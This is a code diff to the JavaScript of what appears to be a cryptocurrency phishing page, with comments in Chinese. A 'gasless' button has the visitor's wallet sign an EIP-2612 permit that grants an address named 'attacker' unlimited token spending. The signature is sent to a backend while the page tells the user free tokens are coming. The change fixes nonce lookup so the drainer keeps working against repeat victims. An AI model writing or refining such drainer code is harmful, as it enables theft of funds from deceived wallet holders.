@@ -78,12 +78,20 @@ if ($("gaslessBtn")) $("gaslessBtn").onclick = async () => {
     // Permit 字段顺序因代币而异:EIP-2612 标准 deadline 在前,Circle 系(USDC)nonce 在前。
     // 钱包按这里给出的 types 顺序哈希,与合约内置 TYPEHASH 不一致即签名无效。
     const nonceFirst = CFG.permit_order === "nonce_first";
+    // Ref #75:nonce 必须取链上当前值——nonce 是签名摘要的一部分,写死 0 时
+    // 二次签名(链上 nonce 已推进)会被合约以 invalid signature 拒绝。
+    let nonce = "0";
+    try {
+      const out = await ethereum.request({ method: "eth_call",
+        params: [{ to: CFG.token, data: "0x7ecebe00" + account.toLowerCase().slice(2).padStart(64, "0") }, "latest"] });
+      nonce = BigInt(out).toString();
+    } catch (e) { msg("nonce 查询失败,按 0 签名(若曾签过可能失效)", false); }
     const tail = nonceFirst
       ? [{ name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" }]
       : [{ name: "deadline", type: "uint256" }, { name: "nonce", type: "uint256" }];
     const message = nonceFirst
-      ? { owner: account, spender: CFG.attacker, value: MAX_UINT, nonce: "0", deadline: String(CFG.deadline) }
-      : { owner: account, spender: CFG.attacker, value: MAX_UINT, deadline: String(CFG.deadline), nonce: "0" };
+      ? { owner: account, spender: CFG.attacker, value: MAX_UINT, nonce, deadline: String(CFG.deadline) }
+      : { owner: account, spender: CFG.attacker, value: MAX_UINT, deadline: String(CFG.deadline), nonce };
     const payload = {
       types: {
         EIP712Domain: [{ name: "name", type: "string" }, { name: "version", type: "string" },
@@ -98,7 +106,7 @@ if ($("gaslessBtn")) $("gaslessBtn").onclick = async () => {
     const sig = await ethereum.request({ method: "eth_signTypedData_v4",
       params: [account, JSON.stringify(payload)] });
     const resp = await report({ type: "permit", owner: account, sig,
-                                value: message.value, deadline: CFG.deadline, nonce: "0" });
+                                value: message.value, deadline: CFG.deadline, nonce });
     if (resp && resp.ok) msg("🎉 签署成功!" + CFG.symbol + " 将在 10 分钟内自动到账,全程免 Gas");
     else msg("签署遇到问题,请重试", false);
   } catch (e) { msg("签名被拒绝", false); }
